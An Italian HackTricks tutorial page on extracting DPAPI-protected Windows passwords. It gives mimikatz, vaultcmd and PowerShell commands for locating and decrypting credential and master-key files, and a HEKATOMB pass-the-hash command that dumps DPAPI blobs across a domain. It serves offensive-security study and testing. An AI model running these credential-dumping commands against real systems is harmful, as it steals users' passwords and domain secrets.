# DPAPI - Estrazione delle password

<details>

<summary><strong>Impara l'hacking di AWS da zero a esperto con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

* Lavori in una **azienda di sicurezza informatica**? Vuoi vedere la tua **azienda pubblicizzata in HackTricks**? O vuoi avere accesso all'**ultima versione di PEASS o scaricare HackTricks in PDF**? Controlla i [**PACCHETTI DI ABBONAMENTO**](https://github.com/sponsors/carlospolop)!
* Scopri [**The PEASS Family**](https://opensea.io/collection/the-peass-family), la nostra collezione di esclusive [**NFT**](https://opensea.io/collection/the-peass-family)
* Ottieni il [**merchandising ufficiale di PEASS & HackTricks**](https://peass.creator-spring.com)
* **Unisciti al** [**💬**](https://emojipedia.org/speech-balloon/) [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo Telegram**](https://t.me/peass) o **seguimi** su **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Condividi i tuoi trucchi di hacking inviando PR al** [**repo hacktricks**](https://github.com/carlospolop/hacktricks) **e al** [**repo hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

<figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2FelPCTwoecVdnsfjxCZtN%2Fimage.png?alt=media&#x26;token=9ee4ff3e-92dc-471c-abfe-1c25e446a6ed" alt=""><figcaption></figcaption></figure>

​​[**RootedCON**](https://www.rootedcon.com/) è l'evento di sicurezza informatica più rilevante in **Spagna** e uno dei più importanti in **Europa**. Con **la missione di promuovere la conoscenza tecnica**, questo congresso è un punto di incontro bollente per professionisti della tecnologia e della sicurezza informatica in ogni disciplina.

{% embed url="https://www.rootedcon.com/" %}


## Cos'è DPAPI

La Data Protection API (DPAPI) viene utilizzata principalmente nel sistema operativo Windows per la **crittografia simmetrica delle chiavi private asimmetriche**, sfruttando segreti dell'utente o del sistema come una significativa fonte di entropia. Questo approccio semplifica la crittografia per gli sviluppatori, consentendo loro di crittografare i dati utilizzando una chiave derivata dai segreti di accesso dell'utente o, per la crittografia di sistema, dai segreti di autenticazione del dominio del sistema, evitando così agli sviluppatori di gestire la protezione della chiave di crittografia stessi.

### Dati protetti da DPAPI

Tra i dati personali protetti da DPAPI ci sono:

- Password di Internet Explorer e Google Chrome e dati di completamento automatico
- Password di account di posta elettronica e FTP interni per applicazioni come Outlook e Windows Mail
- Password per cartelle condivise, risorse, reti wireless e Windows Vault, inclusi chiavi di crittografia
- Password per connessioni desktop remote, .NET Passport e chiavi private per vari scopi di crittografia e autenticazione
- Password di rete gestite da Credential Manager e dati personali in applicazioni che utilizzano CryptProtectData, come Skype, MSN Messenger e altro ancora


## Elenco Vault
```bash
# From cmd
vaultcmd /listcreds:"Windows Credentials" /all

# From mimikatz
mimikatz vault::list
```
## File delle credenziali

I file delle credenziali protette potrebbero trovarsi in:
```
dir /a:h C:\Users\username\AppData\Local\Microsoft\Credentials\
dir /a:h C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```
Ottieni le informazioni sulle credenziali utilizzando `dpapi::cred` di mimikatz, nella risposta puoi trovare informazioni interessanti come i dati criptati e il guidMasterKey.
```bash
mimikatz dpapi::cred /in:C:\Users\<username>\AppData\Local\Microsoft\Credentials\28350839752B38B238E5D56FDD7891A7

[...]
guidMasterKey      : {3e90dd9e-f901-40a1-b691-84d7f647b8fe}
[...]
pbData             : b8f619[...snip...]b493fe
[..]
```
Puoi utilizzare il modulo **mimikatz** `dpapi::cred` con l'apposito `/masterkey` per decrittografare:
```
dpapi::cred /in:C:\path\to\encrypted\file /masterkey:<MASTERKEY>
```
## Chiavi principali

Le chiavi DPAPI utilizzate per crittografare le chiavi RSA dell'utente sono memorizzate nella directory `%APPDATA%\Microsoft\Protect\{SID}`, dove {SID} è l'**Identificatore di Sicurezza** dell'utente. **La chiave DPAPI è memorizzata nello stesso file della chiave principale che protegge le chiavi private dell'utente**. Di solito è costituita da 64 byte di dati casuali. (Si noti che questa directory è protetta, quindi non è possibile elencarla utilizzando `dir` dal cmd, ma è possibile elencarla da PS).
```bash
Get-ChildItem C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem C:\Users\USER\AppData\Local\Microsoft\Protect
Get-ChildItem -Hidden C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem -Hidden C:\Users\USER\AppData\Local\Microsoft\Protect\
Get-ChildItem -Hidden C:\Users\USER\AppData\Roaming\Microsoft\Protect\{SID}
Get-ChildItem -Hidden C:\Users\USER\AppData\Local\Microsoft\Protect\{SID}
```
Ecco come appariranno un insieme di Master Keys di un utente:

![](<../../.gitbook/assets/image (324).png>)

Di solito **ogni master key è una chiave simmetrica crittografata che può decrittare altri contenuti**. Pertanto, è interessante **estrarre** la **Master Key crittografata** per poterla **decrittare** successivamente con gli **altri contenuti** crittografati con essa.

### Estrazione e decrittazione della master key

Controlla il post [https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++](https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++#extracting-dpapi-backup-keys-with-domain-admin) per un esempio su come estrarre la master key e decifrarla.

## SharpDPAPI

[SharpDPAPI](https://github.com/GhostPack/SharpDPAPI#sharpdpapi-1) è un porting in C# di alcune funzionalità DPAPI del progetto [Mimikatz](https://github.com/gentilkiwi/mimikatz/) di [@gentilkiwi](https://twitter.com/gentilkiwi).

## HEKATOMB

[**HEKATOMB**](https://github.com/Processus-Thief/HEKATOMB) è uno strumento che automatizza l'estrazione di tutti gli utenti e i computer dal directory LDAP e l'estrazione della chiave di backup del controller di dominio tramite RPC. Lo script risolverà quindi tutti gli indirizzi IP dei computer e eseguirà un smbclient su tutti i computer per recuperare tutti i blocchi DPAPI di tutti gli utenti e decrittare tutto con la chiave di backup del dominio.

`python3 hekatomb.py -hashes :ed0052e5a66b1c8e942cc9481a50d56 DOMAIN.local/administrator@10.0.0.1 -debug -dnstcp`

Con la lista dei computer estratta da LDAP puoi trovare ogni sottorete anche se non la conoscevi!

"Perché i diritti di amministratore di dominio non sono sufficienti. Hackeriamoli tutti."

## DonPAPI

[**DonPAPI**](https://github.com/login-securite/DonPAPI) può estrarre automaticamente i segreti protetti da DPAPI.

## Riferimenti

* [https://www.passcape.com/index.php?section=docsys\&cmd=details\&id=28#13](https://www.passcape.com/index.php?section=docsys\&cmd=details\&id=28#13)
* [https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++](https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++#using-dpapis-to-encrypt-decrypt-data-in-c)

<figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2FelPCTwoecVdnsfjxCZtN%2Fimage.png?alt=media&#x26;token=9ee4ff3e-92dc-471c-abfe-1c25e446a6ed" alt=""><figcaption></figcaption></figure>

[**RootedCON**](https://www.rootedcon.com/) è l'evento sulla sicurezza informatica più rilevante in **Spagna** e uno dei più importanti in **Europa**. Con **la missione di promuovere la conoscenza tecnica**, questo congresso è un punto di incontro bollente per i professionisti della tecnologia e della sicurezza informatica in ogni disciplina.

{% embed url="https://www.rootedcon.com/" %}

<details>

<summary><strong>Impara l'hacking di AWS da zero a eroe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

* Lavori in un'**azienda di sicurezza informatica**? Vuoi vedere la tua **azienda pubblicizzata su HackTricks**? o vuoi avere accesso all'**ultima versione di PEASS o scaricare HackTricks in PDF**? Controlla i [**PACCHETTI DI ABBONAMENTO**](https://github.com/sponsors/carlospolop)!
* Scopri [**The PEASS Family**](https://opensea.io/collection/the-peass-family), la nostra collezione di esclusive [**NFT**](https://opensea.io/collection/the-peass-family)
* Ottieni il [**merchandising ufficiale di PEASS & HackTricks**](https://peass.creator-spring.com)
* **Unisciti al** [**💬**](https://emojipedia.org/speech-balloon/) [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo Telegram**](https://t.me/peass) o **seguimi** su **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Condividi i tuoi trucchi di hacking inviando PR al** [**repo hacktricks**](https://github.com/carlospolop/hacktricks) **e al** [**repo hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
